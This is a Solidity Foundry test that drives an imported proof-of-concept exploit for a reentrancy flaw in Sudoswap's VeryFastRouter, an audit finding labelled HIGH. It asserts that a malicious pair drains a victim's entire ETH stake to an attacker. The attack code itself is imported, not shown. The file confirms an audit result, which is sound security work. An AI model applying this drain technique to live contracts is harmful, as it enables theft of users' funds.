// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./18412-malicious-pair-can-re-enter-veryfastrouter-to-drain-original.sol";

/*
    Sudoswap lssvm2 — malicious pair re-enters VeryFastRouter to drain the
    original caller's ETH (Cyfrin #18412, HIGH). Self-contained; no fork.

    Drives the same `Exploit` used by the Playground and re-asserts the harm
    (victim's entire ETH ends up with the attacker) via forge-std assertions.
*/
contract VeryFastRouterReentrancyTest is Test {
    Exploit internal exploit;

    uint256 constant STAKE = 100 ether;

    function setUp() public {
        exploit = new Exploit();
    }

    function test_maliciousPairReentersRouterToDrainCaller() public {
        // The attacker EOA funds run() with the victim's stake (as the recorder does).
        vm.deal(address(this), STAKE);

        Attacker attacker = exploit.attacker();
        Victim victim = exploit.victim();
        VeryFastRouter router = exploit.router();
        EvilPair pair = exploit.pair();

        // Baseline before the attack (run() will fund the victim internally).
        assertEq(address(attacker).balance, 0, "attacker should start empty");

        exploit.run{value: STAKE}();

        // HARM: the victim's entire ETH was routed to the attacker.
        assertEq(address(attacker).balance, STAKE, "attacker should hold the full drained stake");
        assertEq(address(victim).balance, 0, "victim should be fully drained");
        assertEq(address(router).balance, 0, "router should retain no ETH");
        assertEq(address(pair).balance, 0, "malicious pair should retain no ETH");
        assertGt(address(attacker).balance, address(victim).balance, "attacker gained at victim's expense");
    }
}
